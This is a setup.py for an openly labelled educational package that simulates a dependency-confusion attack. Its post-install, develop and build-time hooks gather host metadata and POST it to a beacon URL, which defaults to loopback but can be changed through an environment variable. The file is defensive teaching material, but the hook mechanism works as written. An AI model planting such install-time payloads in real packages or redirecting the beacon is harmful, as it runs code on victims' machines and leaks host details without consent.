"""
setup.py for `internal-auth-utils` -- the DEMONSTRATION (attacker) package.

==============================================================================
 EDUCATIONAL / DEFENSIVE-SECURITY ARTIFACT -- READ THIS FIRST
==============================================================================
This package intentionally reproduces the mechanics of a real *dependency
confusion* attack so defenders can see, measure, and block it. It is safe by
construction:

  * It only ever talks to a LOOPBACK monitor (127.0.0.1). There is no code
    path that reaches the public internet or a real package registry.
  * It collects only NON-SENSITIVE host metadata (hostname, username, python
    version, cwd, a list of installed package NAMES). It never reads files,
    environment secrets, credentials, SSH keys, or tokens.
  * It is published only to a LOCAL pypiserver you run yourself.

The post-install hook below is the payload. In a real attack this is where an
adversary would run arbitrary code the moment `pip`/`uv` installs the package.
That single fact -- "installing a package runs attacker code" -- is the whole
lesson.
==============================================================================
"""
import json
import os
import socket
import sys
import getpass
import platform
from datetime import datetime, timezone

from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.develop import develop


# The monitor endpoint. Kept as a literal (not an import of scas_config) because
# setup.py runs in an isolated build environment during `pip`/`uv` install and
# cannot see the repo's modules. Override with SCAS_BEACON_URL if you remapped
# ports. This is ALWAYS a loopback address.
BEACON_URL = os.environ.get("SCAS_BEACON_URL", "http://127.0.0.1:8090/beacon")


def _collect_metadata(trigger: str) -> dict:
    """Gather deliberately non-sensitive host metadata.

    This is the same *category* of reconnaissance a real dependency-confusion
    payload performs (identify the victim host, confirm code execution), but
    scoped to harmless fields so this repo is safe to run and study.
    """
    try:
        installed = sorted(
            {m.split("==")[0].split(" ")[0] for m in _pip_freeze()}
        )[:40]
    except Exception:
        installed = []

    return {
        "trigger": trigger,                       # install | develop
        "package": "internal-auth-utils",
        "package_version": "99.0.0",
        "hostname": socket.gethostname(),
        "username": _safe_username(),
        "python_version": platform.python_version(),
        "platform": platform.platform(),
        "cwd": os.getcwd(),
        "installed_packages_sample": installed,
        "collected_at": datetime.now(timezone.utc).isoformat(),
        # Proof of execution context -- shows the hook ran inside the install.
        "pid": os.getpid(),
        "note": "SIMULATED exfiltration -- loopback only, non-sensitive data",
    }


def _safe_username() -> str:
    try:
        return getpass.getuser()
    except Exception:
        return os.environ.get("USERNAME") or os.environ.get("USER") or "unknown"


def _pip_freeze() -> list[str]:
    """Best-effort list of installed distribution names (no versions needed)."""
    try:
        from importlib import metadata as importlib_metadata

        return [dist.metadata["Name"] for dist in importlib_metadata.distributions()
                if dist.metadata and dist.metadata["Name"]]
    except Exception:
        return []


def _beacon(trigger: str) -> None:
    """POST the metadata to the local monitor. Never raises.

    Uses only the standard library so it works inside the minimal, network-
    isolated build sandbox that modern installers create.
    """
    # When WE build/publish the package (the attacker preparing their upload),
    # we suppress the beacon so the dashboard only records the VICTIM's install.
    if os.environ.get("_SCAS_SUPPRESS_BEACON"):
        return
    payload = _collect_metadata(trigger)
    data = json.dumps(payload).encode("utf-8")
    try:
        import urllib.request

        req = urllib.request.Request(
            BEACON_URL,
            data=data,
            headers={"Content-Type": "application/json",
                     "User-Agent": "internal-auth-utils/99.0.0 (post-install)"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=3) as resp:  # noqa: S310 (loopback)
            resp.read()
        sys.stderr.write(
            "[internal-auth-utils] post-install hook executed; "
            f"beacon sent to {BEACON_URL}\n"
        )
    except Exception as exc:  # pragma: no cover - monitor may be offline
        # A real payload would fail silently. We print so the demo is legible
        # even when the monitor is not running.
        sys.stderr.write(
            f"[internal-auth-utils] beacon to {BEACON_URL} failed: {exc}\n"
        )


class _PostInstallCommand(install):
    """Runs the payload after a normal `pip install` / `uv` install."""

    def run(self):
        install.run(self)
        _beacon("install")


class _PostDevelopCommand(develop):
    """Runs the payload after an editable (`pip install -e`) install."""

    def run(self):
        develop.run(self)
        _beacon("develop")


# --- Build-time trigger (the realistic modern path) -------------------------
# Modern installers (uv, pip via PEP 517) do NOT run the `install` command
# above -- they build a wheel from the sdist and install THAT. But building the
# wheel executes THIS setup.py, so attacker code runs the moment a victim's
# resolver decides to build our sdist. We fire the beacon here for exactly that
# path (egg_info/bdist_wheel/build), which is what `uv sync` / `pip install`
# actually do. This is the single most important line in the whole simulator:
# *resolving a dependency executed our code.*
_BUILD_MARKERS = {"bdist_wheel", "install", "develop", "build", "egg_info"}
if any(marker in sys.argv for marker in _BUILD_MARKERS):
    _fired = os.environ.get("_SCAS_BEACON_FIRED")
    if not _fired:
        os.environ["_SCAS_BEACON_FIRED"] = "1"  # dedupe within one build process
        _beacon("build:" + next(m for m in sys.argv if m in _BUILD_MARKERS))


setup(
    name="internal-auth-utils",
    version="99.0.0",
    description=(
        "DEMO/EDUCATIONAL package simulating a dependency-confusion payload. "
        "Loopback-only, non-sensitive metadata. Do not publish to a real index."
    ),
    long_description=(
        "This is a safe, local-only demonstration package for the Supply Chain "
        "Attack Simulator. It exists to teach defenders how post-install hooks "
        "and dependency confusion work. See the project README."
    ),
    author="Supply Chain Attack Simulator (educational)",
    license="MIT",
    packages=find_packages(),
    python_requires=">=3.9",
    cmdclass={
        "install": _PostInstallCommand,
        "develop": _PostDevelopCommand,
    },
    classifiers=[
        "Development Status :: 4 - Beta",
        "Intended Audience :: Education",
        "Topic :: Security",
    ],
)
